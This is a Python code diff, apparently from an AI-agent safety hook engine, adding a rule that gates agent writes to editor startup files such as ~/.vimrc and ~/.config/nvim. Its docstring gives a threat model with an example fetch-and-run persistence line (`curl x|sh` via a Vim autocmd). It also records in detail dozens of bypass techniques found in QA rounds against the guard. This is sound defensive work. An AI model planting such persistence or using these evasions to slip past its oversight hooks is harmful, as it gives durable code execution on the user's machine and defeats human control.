@@ -11188,6 +11188,7 @@ _FETCH_HUMAN_ESCAPABLE = (
     (patterns.WRAPPER_PROPS_PATH_RE, "a Gradle/Maven wrapper properties file"),
     (patterns.GO_ENV_FILE_PATH_RE, "a Go toolchain env file"),
     (patterns.HTTP_CLIENT_RC_PATH_RE, "a curl/wget config file (.curlrc/.wgetrc)"),
+    (patterns.EDITOR_STARTUP_PATH_RE, "an editor startup/init file (vimrc/nvim/emacs.d)"),
 )
 
 
@@ -14502,6 +14503,741 @@ def rule_http_client_config_protect(ev: Event, policy=None) -> Optional[Decision
     return None
 
 
+
+# ---- editor startup/init hijack (Vim/Neovim/Emacs/...): human-escapable -----
+def _editor_startup_allowed_by_policy(cfg: dict, text: str) -> bool:
+    """`allow` is matched against the lexically NORMALIZED path, so
+    `~/dotfiles/../.vimrc` does not satisfy an `allow: ['/dotfiles/']`
+    (QA round 2)."""
+    allow = cfg.get("allow") or []
+    if isinstance(allow, str):
+        allow = [allow]
+    elif not isinstance(allow, (list, tuple)):
+        return False                       # QA round 3: bad config, no crash
+    if not isinstance(text, str) or not text:
+        return False
+    try:
+        import urllib.parse as _up
+        text = _up.unquote(text)           # QA round 3: `%2e%2e`
+    except Exception:
+        pass
+    norm = patterns._ed_dotdot_normalize(text.replace("\\", "/"))
+    if ".." in norm.replace("\\", "/").split("/"):
+        return False
+    for pat in allow:
+        try:
+            if re.search(str(pat), norm, re.IGNORECASE):
+                return True
+        except re.error:
+            continue
+    return False
+
+
+def _editor_startup_shell_allowed(cfg: dict, cmd: str, cwd=None) -> bool:
+    """Shell form: every word that names a gated path must itself satisfy
+    `allow` -- an agent appending `# /dotfiles/` to the command, or
+    mentioning an allowed path elsewhere in it, does not (QA round 2)."""
+    if not cfg.get("allow") or not isinstance(cmd, str):
+        return False
+    words = [w for w in re.findall(r"[^\s'\"<>|&;()`]+", cmd)
+             if patterns.editor_startup_path_hit(w)]
+    if not words or not all(_editor_startup_allowed_by_policy(cfg, w) for w in words):
+        return False
+    # QA round 3: with the allowed words blanked out, the full detector
+    # (globs, quotes, zsh groups, `cd` joins) must find nothing else.
+    rest = cmd
+    for w in sorted(set(words), key=len, reverse=True):
+        rest = rest.replace(w, " ")
+    if (patterns.editor_startup_shell_path_hit(rest, cwd)
+            or patterns.editor_startup_shell_path_hit(normalize.scan_surface(rest), cwd)):
+        return False
+    # Resolved placements (`cp nvim ~/.config` -> `~/.config/nvim`) must each
+    # be allowed too, and an unknown-name placement never is.
+    for c in [cmd] + list(dict.fromkeys(normalize.scan_surface(cmd, sep="\x1e").split("\x1e"))):
+        paths, unknown = patterns.editor_startup_placement_targets(c, cwd)
+        if unknown or not all(_editor_startup_allowed_by_policy(cfg, x) for x in paths):
+            return False
+    return True
+
+
+# Tool-name words that make an MCP tool a shell/process runner. Narrower
+# than the curl/wget sibling's list: `send`/`run`/`command` alone
+# (`send_email`, `actions_run_trigger`) are messaging/CI, not a shell, and
+# editor paths turn up in prose far more often (QA round 2).
+_ED_SHELL_TOOL_WORDS = frozenset((
+    "exec", "execute", "process", "terminal", "shell", "eval", "interact",
+    "repl", "spawn", "bash", "powershell", "sh", "cmd", "tmux", "console",
+    "zsh", "pwsh", "command", "run", "send", "ssh", "remote", "launch",
+    "program", "keys", "commandline", "cmdline", "stdin", "pty", "tty",
+    "keystrokes", "xdotool",
+))
+# ...unless the tool is plainly messaging/CI (QA round 2: `send_email`,
+# `send_message`, `actions_run_trigger`). Judged on the WHOLE tool name,
+# server segment included (QA round 3: `mcp__tmux__send_keys`).
+_ED_MESSAGING_WORDS = frozenset((
+    "email", "mail", "gmail", "message", "messages", "msg", "chat", "post",
+    "comment", "reply", "issue", "trigger", "workflow", "notification",
+    "notify", "sms", "dm", "slack", "discord", "teams", "invite", "review",
+    # QA round 4: database / payment / browser-script tools are not shells.
+    "query", "sql", "database", "db", "payment", "payments", "invoice",
+    "issues", "sentry", "commit", "events", "traces", "fetch", "think", "thinking",
+    "sequential", "thought",
+    "evaluate", "javascript", "js", "browser", "playwright", "puppeteer",
+))
+_ED_PROSE_KEY_WORDS = frozenset((
+    "message", "msg", "title", "description", "query", "q", "search", "prompt",
+    "question", "topic", "summary", "comment", "note", "notes", "subject", "body",
+    "reason", "label", "name",
+))
+_ED_STRONG_SHELL_WORDS = frozenset((
+    "shell", "bash", "sh", "zsh", "pwsh", "powershell", "terminal", "exec",
+    "execute", "pty", "tty", "stdin", "tmux", "ssh", "console", "cmd", "spawn",
+))
+_ED_FILE_TOOL_WORDS = frozenset(("file", "files", "fs", "filesystem", "write",
+                                 "save", "path", "dir", "directory", "folder",
+                                 "upload", "download", "copy", "move", "replace",
+                                 "edit", "patch", "insert", "editor", "text"))
+# Remote-repository servers: a `path` there names a file in a hosted repo,
+# not on this machine (QA round 4).
+_ED_REMOTE_SERVERS = frozenset((
+    "github", "gitlab", "bitbucket", "gitea", "azure_devops",
+    # QA round 5: knowledge/doc/remote-storage servers.
+    "notion", "memory", "google-drive", "google_drive", "gdrive", "drive",
+    "context7", "linear", "confluence", "jira", "atlassian", "asana", "slack",
+    "gmail", "supabase", "hubspot", "intercom", "figma", "canva",
+))
+_ED_COMMAND_KEYS = frozenset((
+    "command", "cmd", "script", "shell_command", "commandline", "command_line",
+    "cmdline", "argv", "keys", "chars", "exec", "entrypoint", "binary",
+    "argv_list",
+))
+# Plain content keys of a write whose OWN target is set: a quoted path or
+# diff inside an ordinary file's body is not a write to that path (QA
+# round 2; the curl/wget sibling's round 5-7 rule).
+_ED_PLAIN_CONTENT_KEYS = frozenset(("content", "contents", "text", "body",
+                                    "file_content", "new_content", "file_text"))
+
+
+_ED_PATH_SHAPE_RE = re.compile(
+    r"^(?:file://|[/\\~.]|[A-Za-z]:[/\\]|%\w+%|\$\{?\w+)[^\r\n]*$")
+# A relative path (`home/u/.vimrc`, `Documents/../.vimrc`): no whitespace,
+# at least one separator (QA round 1).
+_ED_REL_PATH_RE = re.compile(r"^[^\s]*[/\\][^\s]*$")
+_ED_DELETE_WORDS = frozenset(("delete", "remove", "rm", "unlink", "trash"))
+# An arg key carrying bytes to write: a read/delete-shaped tool name never
+# exempts a call that has one (`open_file{path, content}`,
+# `delete_then_recreate{content}` -- QA round 1).
+_ED_CONTENT_KEY_WORDS = frozenset((
+    "content", "contents", "data", "text", "body", "source", "src", "input",
+    "payload", "new", "replacement", "patch", "diff", "edits", "edit",
+    "append", "insert", "value", "lines", "code", "script", "bytes", "blob",
+))
+
+
+def _editor_startup_path_shaped(v) -> bool:
+    """A single-line string that starts like a path (or is a whitespace-
+    free relative path) and names an editor init file/tree. Text after the
+    match may contain spaces (`plugin/a b.lua`, QA round 1); prose does not
+    start like a path."""
+    if not isinstance(v, str):
+        return False
+    t = v.strip()
+    if not t or "\n" in t or "\r" in t or len(t) > 4096:
+        return False
+    if not (_ED_PATH_SHAPE_RE.match(t) or _ED_REL_PATH_RE.match(t)):
+        return False
+    if not patterns.editor_startup_path_hit(t):
+        return False
+    if not re.search(r"\s", t):
+        return True
+    # Spaces are allowed only INSIDE the path: after the last gated name the
+    # tail must continue the path (`/plugin/a b.lua`), not be prose
+    # (`.helix ok`, `~/.vimrc is broken` -- QA round 3).
+    m = None
+    for m in patterns.EDITOR_STARTUP_PATH_RE.finditer(t):
+        pass
+    if m is None:
+        return False
+    tail = t[m.end():]
+    return (not tail or tail[0] in "/\\"
+            or re.fullmatch(r"[ .]*(?::[^\s/\\]*)?", tail) is not None)
+
+
+def _editor_startup_mcp_target(ev: Event) -> str:
+    """The editor init path a (non-read-only) MCP call touches, or ''."""
+    a = ev.args or {}
+    p = _path(ev)
+    if p and "\n" not in p and patterns.editor_startup_path_hit(p):
+        return p
+    if p and "\n" not in p:
+        a = {k: v for k, v in a.items() if str(k) not in _ED_PLAIN_CONTENT_KEYS}
+    flat = [str(x) for x in _flatten_strings(a)]
+    for s_ in flat:
+        if _editor_startup_path_shaped(s_):
+            return s_.strip()
+    for s_ in flat:
+        if patterns.editor_startup_patch_hit(s_):
+            return "<patch touching an editor init file>"
+    for k_ in _http_rc_mapping_keys(a):
+        if "\n" not in k_ and patterns.editor_startup_path_hit(k_.strip()) and (
+                _editor_startup_path_shaped(k_) or not re.search(r"\s", k_.strip())
+                or _ED_PATH_SHAPE_RE.match(k_.strip())):
+            return k_
+    return ""
+
+
+def _editor_startup_mcp_argv(a: dict) -> Optional[str]:
+    """A shell-runner's argv, re-joined as ONE command line (QA round 5:
+    flattened with newlines, `["cp","-r",src,dst]` became four commands)."""
+    import shlex as _sh
+
+    def _j(v):
+        if isinstance(v, (list, tuple)) and all(isinstance(x, (str, int, float)) for x in v):
+            return _sh.join(str(x) for x in list(v)[:4000])
+        return v if isinstance(v, str) else None
+
+    lower = {str(k).lower(): v for k, v in a.items()}
+    for ck, ak in (("command", "args"), ("cmd", "args"), ("program", "arguments"),
+                   ("executable", "args"), ("binary", "parameters"),
+                   ("entrypoint", "argv_list"), ("command", "arguments"), ("argv", None)):
+        c = _j(lower.get(ck))
+        if c is None:
+            continue
+        extra = _j(lower.get(ak)) if ak else None
+        return (c + " " + extra) if extra else c
+    return None
+
+
+def _editor_startup_has_content_key(a, _depth: int = 0) -> bool:
+    if _depth > 6 or not isinstance(a, dict):
+        return False
+    for k, v in a.items():
+        if _http_rc_words(k) & _ED_CONTENT_KEY_WORDS and v not in (None, "", [], {}):
+            return True
+        if isinstance(v, dict) and _editor_startup_has_content_key(v, _depth + 1):
+            return True
+    return False
+
+
+def rule_editor_startup_protect(ev: Event, policy=None) -> Optional[Decision]:
+    """Gate writes to a terminal editor's startup/init files and runtime
+    directories: Vim (``~/.vimrc``/``_vimrc``/``.gvimrc``, ``~/.vim/**``,
+    ``~/vimfiles/**``, ``~/.config/vim/**``, ``/etc/vim/**``,
+    ``.../share/vim/**``, ``.exrc``), Neovim (``~/.config/nvim/**``,
+    ``~/.local/share/nvim/**``, ``%LOCALAPPDATA%\\nvim[-data]``,
+    ``/etc/xdg/nvim/**``, project ``.nvim.lua``/``.nvimrc``), Emacs
+    (``~/.emacs[.el]``, ``~/.emacs.d/**``, ``~/.config/emacs/**``, Doom/
+    Spacemacs config, ``site-start.el``/``site-start.d``, site-lisp
+    ``default.el``, ``/etc/emacs/**``, ``.dir-locals.el``), Kakoune/micro/
+    Helix user config (and Helix's workspace ``.helix/``), IdeaVim's
+    ``.ideavimrc``.
+
+    PLAN / THREAT MODEL: every one of these is executed as code (Vimscript
+    ``system()``/``:!``, Lua ``os.execute``/``vim.fn.jobstart``, Elisp
+    ``shell-command``/``call-process``, Kakoune ``%sh{}``, a Helix
+    ``languages.toml`` language-server ``command``) with the human's full
+    privileges, on the editor's next launch (silently for every user-level
+    file; Neovim 0.9+ ``.nvim.lua``/exrc and Emacs ``.dir-locals.el``
+    ``eval:`` entries prompt first by default, so those two are gated as
+    defence in depth for users who have trusted/disabled the prompt) -- and the editor is
+    launched not only by the human: ``git commit`` without ``-m``, ``git
+    rebase -i``, ``git tag -a``, ``crontab -e``, ``sudoedit`` and ``visudo``
+    all spawn ``$EDITOR`` (``visudo``/``sudo -E vim`` with ``$HOME`` kept
+    run the user's config as root). A prompt-injected agent that appends
+    ``autocmd VimEnter * silent !curl x|sh`` to ``~/.vimrc``, or drops
+    ``~/.config/nvim/plugin/x.lua``, gets durable code execution that
+    survives the session, outlives any sandboxed run that left ``$HOME``
+    writable, and fires the next time anybody commits. It is the editor
+    analogue of ``rule_shell_persist_protect``'s ``.bashrc`` -- and no
+    existing guard named any of these paths (``rule_repl_rc_exec_protect``
+    covers debugger/REPL rc files, ``rule_vscode_settings_exec_protect``
+    and ``rule_agent_exec_config_protect`` GUI-IDE/agent configs).
+
+    Because the files are Turing-complete there is no benign subset to
+    allowlist and an exec-shape denylist would leak by alias, so ANY write
+    is gated (``ask`` by default) -- the same trade-off the shell-startup
+    guard makes. Editing one's own editor config is legitimate but rare for
+    an agent, so a human confirmation is a low cost.
+
+    Edit/Write/MultiEdit: the target path is matched. MCP: a shell-type
+    tool (``run_command``/``start_process``/tmux ``keys``) is re-judged as a
+    Bash command; a read-shaped tool (``read_file``, ``list_directory``,
+    by whole word on the tool name, with no output or content argument) or
+    a tool named only with delete words plus nouns (``delete_file``) and no
+    content argument passes; any other call naming such a path -- under any key, as a
+    patch header, or as a mapping key -- is gated. Shell: INVERTED, as in
+    ``rule_http_client_config_protect`` -- a command naming such a path
+    (literally, through ``\\`` escapes, or a glob/brace word bash would
+    expand to one: ``~/.vim{rc,}``, ``~/.config/nv*/init.lua``,
+    ``~/.config/*/init.lua``) is gated unless every simple command in it
+    only reads or deletes and nothing is redirected to a file. ``curl -o
+    ~/.vimrc <url>`` is also caught by ``rule_fetch_to_file_protect``, which
+    this guard's path regex is registered with.
+
+    Config (``policy.editor_startup``): ``mode`` (deny|ask|monitor|off,
+    default ask), ``allow`` (regexes on the path/command -- a dotfiles
+    manager the human trusts). Escapable only by a human: a trailing ``#
+    aegis-allow`` on the shell form, or ``AEGIS_ALLOW_EDITOR_STARTUP=1`` set
+    before launch; a spawned agent can do neither.
+
+    Honest scope: ``$VIMINIT``/``$EXINIT``/``$MYVIMRC``/``NVIM_APPNAME``/
+    ``-u <file>``/``XDG_CONFIG_HOME`` relocations to directories with none
+    of these names, a plugin manager that fetches code by itself
+    (``nvim --headless +Lazy\\ sync``) after a benign-looking spec change
+    made elsewhere, nano's ``nanorc`` ``formatter``/``linter`` (runs only on
+    a keypress), modelines in ordinary files, and paths assembled indirectly
+    (variable concatenation, a ``cd`` computed from a variable) are not
+    covered -- the same
+    "computed indirectly" class every sibling guard discloses. A project
+    file under a directory literally called ``.vim``/``.helix`` is gated
+    too. Accepted false ASKs on the shell form: any non-read verb in a
+    command that merely mentions a path (``git add .vimrc`` in a dotfiles
+    repo, ``find ~/.config/nvim -name '*.lua'``), and a bulk extract/
+    recursive copy/sync whose destination is the home or config root
+    (``tar xf x.tgz -C ~``, ``rsync -a d/ ~/``, ``stow -t ~ pkg``) -- it
+    can plant ``.vimrc`` without naming it, so it is gated too.
+
+    Engine-wide note (not specific to this guard): ``engine._run`` returns
+    the FIRST non-ALLOW decision, so under ``mode: deny`` an earlier
+    sibling's ASK on the same command (install-review, fetch-to-file,
+    shell-persist) is what the human sees. Making a later DENY win changes
+    28 existing sibling-guard expectations and is left as a separate,
+    engine-level change.
+
+    QA history (two independent reviews, bypass-hunting and design/false-
+    positive, in parallel). Round 1 found: ``..`` segments
+    (``~/.config/x/../nvim/init.lua``) defeated every parent-anchored
+    alternative -- paths are now also matched after lexical normalization,
+    URL-decoding (``file:///home/u/%2Evimrc``) and zsh ``(...)`` removal;
+    spaced file names and relative paths under unlisted MCP keys; bash
+    ``[^x]``, ``[[:lower:]]`` and ``{a..b}`` globs ``fnmatch`` doesn't
+    speak; bare ``*`` under ``.local``, the root or ``~``; missing startup
+    locations (``$VIM\\vimrc``, ``vim91/`` runtime, MacVim, Emacs
+    ``subdirs.el``/site-lisp/native-lisp, system Kakoune/Helix runtime,
+    Flatpak ``~/.var/app``, Neovim's ``luac`` cache); ``LESSOPEN=... less``
+    turning a "read" into a write (exec-bearing env prefixes now void the
+    read-only exemption); zsh glob qualifiers (``~/.vimrc(N)``); read- or
+    delete-shaped MCP tool names carrying content (``open_file{content}``,
+    ``delete_then_recreate``); a per-command glob-candidate budget (fails
+    closed); ``cd DIR && cp x nvim/init.lua``; bulk extraction into ``~``.
+    False positives fixed: ``| sort``, ``git log/diff/status/show``.
+    Round 2 (design review) found false ASKs from glob expansion (``cp
+    *.el dist/`` via ``site-start.el``, ``cp -r config/* build/``, quoted
+    ``sed 's/.*/X/'``) and from unanchored ``etc/``/``share/``/``vim/``/
+    ``site-lisp`` (``docs/etc/vim``, ``build/share/vim``) -- now a bare
+    wildcard expands only to each parent's real gated children, ``.*``
+    only under a home dir, quoted text is never globbed, ``etc`` must be
+    the root's and ``share``/``lib`` must sit under an install prefix;
+    quoted paths/diffs inside an ordinary file write's ``content``; MCP
+    ``send``/``run`` messaging tools judged as shells; ``allow`` regexes
+    satisfiable by ``dotfiles/../`` or a trailing comment (now matched on
+    the normalized path, and on every gated path word of a shell
+    command); a crash (fail-open) on non-dict MCP args; a ~80 s glob bomb
+    (now a per-command budget, ~2 s, failing closed); and docstring
+    overstatements (sudoedit, prompted exrc/dir-locals). Round 3 found:
+    the ``..`` normalizer mishandled ``.`` segments (``x/./../nvim``) and
+    was quadratic (116 s on 380 KB) -- replaced by a linear per-token
+    resolver that clamps ``/..`` at the root, with a size cap failing
+    closed; the round-2 ``/etc`` anchor missed ``/./etc``, ``../etc``,
+    ``/proc/<pid>/root/etc`` and MSYS2/Cygwin roots; the round-2 MCP
+    shell-tool narrowing dropped tmux ``send_keys``, ``run_command
+    {commandline}``, ``argv``/``program+arguments``/``executable+args``
+    and ``ssh``/``remote`` runners (now judged on the whole tool name,
+    server included, case-insensitive keys, with a messaging/CI word
+    exclusion); user-writable runtimes under Homebrew Cellar/opt, bob/mise/
+    asdf, portable tarballs and ``Emacs.app`` (distinctive runtime subpaths
+    are now gated under any prefix); the shell ``allow`` check could be
+    satisfied by one allowed word while a glob/quote/``cd``-join plant rode
+    along (now the remainder must be clean), ``%2e%2e`` in ``allow``; ``mv``/
+    ``ln``/``cp -t``/``git -C <root> clone`` of a gated-named dir into the
+    config root; the session ``cwd`` for relative paths; a non-list
+    ``allow`` crashing the rule; 8.3 short names. False positives fixed:
+    ``apps/*/config/x`` (a bare ``*`` now expands only to real parents of
+    the next name), root-anchored ``usr`` (package staging trees), prose
+    after a path (``.helix ok``). Round 4 found: placement into SYSTEM dirs
+    (``sudo cp /tmp/vimrc /etc/``) and the round-3 "verb + home dest"
+    heuristic both false-ASKing (``mv report.pdf ~``) and missing ``cd
+    ~/.config && mv /tmp/nvim .`` -- replaced by a placement analyzer that
+    resolves each ``cp``/``mv``/``ln``/``install``/``rsync``/archive/``git
+    clone``/``stow`` destination against ``cd``s and the cwd, joins source
+    basenames, and gates unknown names (globs, ``$var``, ``d/.``, archives)
+    only into a gated parent dir; glued short options (``sort
+    -o/etc/vimrc``); ``cd`` + glob and ``cd -P``/``--``; the round-3
+    prefilter hiding zsh ``~/.(e)macs``; stdin/pty/computer-use ``type``
+    MCP runners and any command-shaped string leaf; ``$'\\u0076'``
+    escapes; ``GIT_EXTERNAL_DIFF``/``GIT_CONFIG_*`` voiding the git read
+    exemption; SpaceVim, ``.vim_runtime``, chemacs ``.emacs-profiles.el``;
+    MCP cwd-relative paths; ``allow`` remainder ignoring cwd. False positives
+    fixed: DB/payment/browser-script/remote-repo MCP tools. Round 5 found
+    the placement analyzer's shlex parsing took ``2>/dev/null`` and ``#
+    comment`` as the destination, and ``scan_surface``'s space-joined
+    renderings merged commands -- replaced by a bash-faithful tokenizer
+    (quotes, ANSI-C, comments, ``$(``/backticks/subshells, redirections and
+    heredoc bodies dropped) fed newline-separated renderings; clustered
+    ``-rt DIR``, GNU ``--targ=`` abbreviations, ``--parents``; ``git
+    clone`` value options, ``gh repo clone``/``hg clone``/``svn
+    checkout``; wrappers (``timeout``/``nice``/``stdbuf``/``busybox``/
+    ``eval``/``env -C``/``env -S``/``sudo -nu``) and ``find -exec``;
+    ``cd`` evasion via failed/subshell/``popd`` ``cd``s (every directory
+    the command could be in is now considered); PowerShell ``-Path``/
+    ``-Destination``, ``Expand-Archive``, ``xcopy``/``robocopy``; MCP
+    runner argv lists and their own ``cwd``; ``patch`` into a gated dir;
+    a 5-7 s path blow-up (directory length capped, failing closed). False
+    positives fixed: commands with 400+ lines (only relevant segments
+    count), ``cd ~ && mv *.log logs/``, ``pkgroot/etc``, knowledge/remote
+    MCP servers (memory, Notion, Drive, context7, Linear, ...). Round 6
+    found a 146 s blow-up from ``cd`` x ``*``-source fan-out (gated-parent
+    checks are now cached, once per destination, with bounded directory
+    sets failing closed); heredoc false starts (``$((1<<2))``, ``((x<<=1))``,
+    ``${x#<<}``) and partially-quoted delimiters (``E"O"F``) swallowing the
+    commands after them; ``$(..)``/backticks inside double quotes and
+    unquoted heredoc bodies; an unterminated heredoc; the Windows-hint
+    backslash rewrite breaking ``\\'`` (both readings are now analyzed);
+    bash-exact ``$'..'`` decoding (``\\u76``, ``\\x{76}``, ``\\cv``);
+    clustered ``tar -xzC DIR``/``unzip -qod DIR`` and old-style ``tar
+    xzfC``; ``coproc``, ``jar``/``ar`` extraction; more MCP runner cwd
+    keys; a shell runner on a server named like a remote one. False
+    positives fixed: ``git -C DIR log``, Sentry/issue search, a commit
+    message mentioning ``~/.vimrc``. Round 7 found git work-tree updates
+    (``cd ~ && git pull``, bare-repo dotfiles ``git --work-tree=$HOME
+    checkout``, ``git apply``/``am``/``stash pop``) were ungated -- they now
+    count as unknown-name placement into the work tree, as do chezmoi/yadm/
+    vcsh (which the placement prefilter had silently skipped); the round-6
+    ``search``/``log`` messaging words excluded real search-replace editors
+    and ``run_*_log`` runners (removed); ``cd`` into a glob (``cd
+    ~/.conf*``); ``cp -T``/``ditto``/``xcopy`` contents copies; ``wget
+    -r``, remote ``scp``/``rsync`` sources, ``svn export``, ``degit``,
+    ``rclone``/``aws s3``/``docker cp``/``kubectl cp``, ``unsquashfs``/
+    ``cabextract``/``lha``, ``python -m zipfile|tarfile -e``; ``$(..)``
+    inside ``${..}``/``$((..))``; exact MCP cwd keys before ``*dir``;
+    ``relative_path``; ``~/.vimrc.local``. False positives fixed: fetch and
+    thinking tools. Round 8 found ``unzip -o`` (overwrite) read as an output
+    dir, hiding extraction into the cwd -- directory options are now per
+    verb and case-sensitive; global options before ``aws``/``rclone``/
+    ``kubectl``/``docker`` subcommands; ``kubectl cp`` contents semantics;
+    ``pnpm dlx``/``yarn dlx``/``bun x``/``npx pkg@ver``; ``wget -rP``;
+    ``python -I -m zipfile``; ``export GIT_WORK_TREE``/``-c core.worktree``;
+    copier/cookiecutter/giget; MCP git work-tree tools on a home repo.
+    False positives fixed: with session cwd ``$HOME``, ``cd proj && git
+    pull`` (a ``cd`` followed by ``&&`` now replaces the candidate cwds --
+    after ``;`` the earlier ones are kept, so ``cd /nonexistent; tar xf``
+    is still judged in ``~``; ``cd /x && true; tar xf`` is an accepted
+    residual), ``log_dir`` taken as a runner cwd, file writes whose content
+    quotes an editor command. Round 9 found the round-8 ``cd X &&`` narrowing
+    unsound under ``cd -``/``$OLDPWD``, subshell or ``$(..)`` ``cd``s, a
+    later ``||``, ``! cd`` and brace groups -- narrowing now applies only
+    to a flat ``&&`` chain with none of those constructs, and ``cd -``
+    resolves to the previous cwd; ``degit``/``tiged``/``giget``/
+    ``cookiecutter`` default to the cwd (and ``--output-dir=``); terminal
+    ``write_input`` tools with a ``uri``/``file`` address are no longer
+    treated as file writes; more MCP git/runner cwd keys; ``python -Im``.
+    Accepted residual (design decision): unknown-name extraction or bulk
+    copy into ``~/.local`` itself (not ``~/.local/share``) is not gated --
+    tool-install tarballs routinely target it, so gating it would ASK on
+    every ``tar xf node.tgz -C ~/.local``; an archive whose own tree holds
+    ``share/nvim/...`` can therefore land there unasked. Round 10 found a
+    copied/linked directory that is itself a gated PARENT (``cp -r .config
+    ~/``, ``sudo cp -r d/etc /``, ``docker cp c:/root/.config ~/``, MCP
+    ``move_file`` onto ``~/.config``) and symlink aliases of one (``ln -s
+    ~/.config c``) ungated -- now gated as unknown-name placement; a single
+    ``|``/background ``&``, ``CDPATH``, ``cd $VAR``/``pushd +N`` still let
+    the cwd narrowing drop the session cwd (now disable it); ``bash -c``
+    bodies are analyzed inline with the surrounding ``cd`` state;
+    ``python3.12``, ``uv run``/``poetry run``, ``-X``/``-W``; ``cmake -E
+    tar``, ``dpkg -x``; NVIM_APPNAME-style ``~/.config/nvim-*`` and the
+    LunarVim/AstroNvim/NvChad/LazyVim dirs. False positives fixed: ``cd ..``
+    applied twice across scan renderings (each rendering is now analyzed
+    with fresh state), Serena ``replace_regex`` content. Round 11 found the
+    round-10 ``ln`` alias check skipped for ``$HOME/.config`` / ``~/.``
+    spellings (``$HOME`` is now normalized and the link-target check runs
+    before the unknown-name shortcut; a relative target resolves against
+    the LINK's directory); copy/move/link ONTO a gated parent that does not
+    exist yet (fresh container/CI home -- checked against the real
+    filesystem, since the hook runs where the command will); ``bash -c --
+    BODY``/``-c -e``/``-c +x``, ``echo 'cmd' | sh``, ``sh -s <<< 'cmd'``,
+    ``su -c``/``script -c``; merging into ``/`` or ``/usr``; the 4000-word
+    cap (now fails closed); atool/aunpack/dtrx/unp. False positives fixed:
+    a pipe after ``cd proj && git pull | tail`` no longer disables cwd
+    narrowing (only a pipe touching the ``cd`` stage does); extracted
+    ``bash -c`` bodies are no longer re-judged without their ``cd``; the
+    gated-parent-source rule is limited to home and ``/etc`` targets
+    (``cp -r build/share /usr/local/`` passes). Round 12 found the live-
+    filesystem "does not exist yet" check defeated by moving the gated
+    parent aside in the same command (``mv ~/.config /tmp/o && mv /tmp/p
+    ~/.config``) -- ``mv``/``rm``/``trash`` sources earlier in the command
+    are now tracked as removed; and the quote-stripped scan rendering
+    changing what ``bash -c 'cd /tmp && git pull'`` runs (skipped: the
+    tokenizer handles quotes itself). Round 13 found ``eval 'cd ~ && tar
+    xf x'`` regressed (only the first segment of an ``eval`` body was
+    analyzed; now all, inline, with the cwd state); removed-path tracking
+    missed relative sources under an absolute target and ``mv
+    ~/.config{,.bak}``/glob sources (sources are now resolved against every
+    cwd, words are brace-expanded in bash order, globs expanded); heredoc
+    bodies fed to a shell (``bash <<'EOF'``, ``cat <<EOF | sh``) are now
+    analyzed as commands; ``$"..."`` locale quoting (and ``$""``). Round 14
+    found a wrapper before the heredoc-fed shell (``sudo bash <<EOF``,
+    ``env -i sh``, ``cat <<EOF | sudo -u x bash``, ``|&``, ``sudo -i``)
+    skipped the round-13 body analysis -- wrappers are now stripped before
+    the shell test, for here-strings too; ``bash -c "$(cat <<'EOF' ...
+    EOF)"``; ``printf '%s\\n' 'cmd' | sh``; a brace expansion truncated at
+    its budget now fails closed. Round 15 found the round-14 pipe check
+    re-tokenizing the whole line tail per ``|`` (82 s on 3.5 KB of stacked
+    heredocs + pipes -- a fail-open timeout); it now inspects only the
+    command right after each pipe, with a pipe budget and a cache. Round 16
+    found the per-heredoc-operator cost still super-linear (30 s on 99 KB
+    of ``<<''`` operators) -- more than 64 heredoc/here-string operators in
+    one command now fails closed -- and the round-15 plain split losing
+    ``| (bash)``, ``| bash>/dev/null`` and quoted wrappers (the tokenizer
+    now runs on the bounded slice). Disclosed: like every ``_flatten_strings``
+    based check, MCP args nested more than 12 levels deep are not walked.
+    Round 17 PASSED (no HIGH; no regression, no fail-open slow path, no
+    realistic false positive). Its pre-existing MEDIUM notes are accepted
+    residuals for a future round: a stdin shell introduced by a LEADING
+    redirect (``<<EOF bash``, ``<<<'..' bash``), a trailing ``|`` continued
+    onto the next line before the shell, and ``| exec -a x bash`` / ``| if
+    ..; then bash; fi`` wrappers -- each needs deliberate reordering; the
+    natural forms are gated."""
+    cfg = getattr(policy, "editor_startup", None) or {}
+    raw_mode = cfg.get("mode", "ask")
+    mode = str(raw_mode).lower()
+    if mode in ("off", "false") or raw_mode is False:
+        return None
+    action = Action.ASK if mode == "ask" else Action.DENY
+
+    def _finish(would: Decision) -> Optional[Decision]:
+        if mode == "monitor":
+            _record_monitor(ev, would, "editor-startup-protect-monitor")
+            return None
+        return would
+
+    if ev.args is not None and not isinstance(ev.args, dict):
+        # A non-dict arg payload must not crash the rule (a crash is
+        # fail-open in the engine -- QA round 2).
+        ev = Event.make(ev.event, tool=ev.tool, action=ev.action, cwd=ev.cwd,
+                        args={"value": ev.args})
+
+    if ev.action == ActionClass.MCP:
+        a0 = ev.args or {}
+        _srv = str(ev.tool or "").split("__")
+        _tw0 = _http_rc_words(_srv[-1])
+        if len(_srv) >= 3 and _srv[1].lower() in _ED_REMOTE_SERVERS and not (
+                _tw0 & (_ED_STRONG_SHELL_WORDS | {"run", "command", "commands"})):
+            # A remote/knowledge server -- unless the tool is plainly a shell
+            # runner, whatever the server is called (QA round 6).
+            return None
+        tool_words = _http_rc_words(str(ev.tool or "").replace("__", "_"))
+        lkeys = {str(k).lower() for k in a0}
+        if isinstance(a0.get("args"), dict):
+            lkeys |= {str(k).lower() for k in a0["args"]}
+        if (tool_words & _ED_MESSAGING_WORDS and not (tool_words & _ED_FILE_TOOL_WORDS)
+                and not (tool_words & _ED_STRONG_SHELL_WORDS)):
+            # Messaging / DB / payment / browser-script tools neither run a
+            # local shell nor write local files; an editor path in their
+            # text is prose or data (QA round 4).
+            return None
+        shellish = bool(tool_words & _ED_SHELL_TOOL_WORDS) and not (
+            tool_words & _ED_MESSAGING_WORDS)
+        if (shellish or lkeys & _ED_COMMAND_KEYS
+                or {"program", "arguments"} <= lkeys or {"executable", "args"} <= lkeys):
+            shell_cmd = _editor_startup_mcp_argv(a0)
+            parts = [str(x) for x in _flatten_strings(a0)]
+            flat = "\n".join(parts)[:200000] if parts else None
+            # Judged separately (QA round 10: concatenated, `cd ..` ran twice).
+            shell_cmd = [c for c in dict.fromkeys((shell_cmd, flat)) if c]
+        else:
+            shell_cmd = None
+        mcp_cwd = ev.cwd
+        _cands = list(a0.items())
+        for _v in a0.values():
+            if isinstance(_v, dict):
+                _cands.extend(_v.items())          # `{options: {cwd}}` (QA round 6)
+        _exact = ("cwd", "cd", "pwd", "workdir", "workingdir", "workingdirectory",
+                  "currentdir", "currentdirectory", "workingfolder", "cwdpath", "location",
+                  "workingpath")
+        for _pass in (0, 1):               # exact names first (QA round 7: `logdir`)
+            for _k, _v in _cands:
+                kn = re.sub(r"[_\-\s]", "", str(_k).lower())
+                ok = kn in _exact if _pass == 0 else (
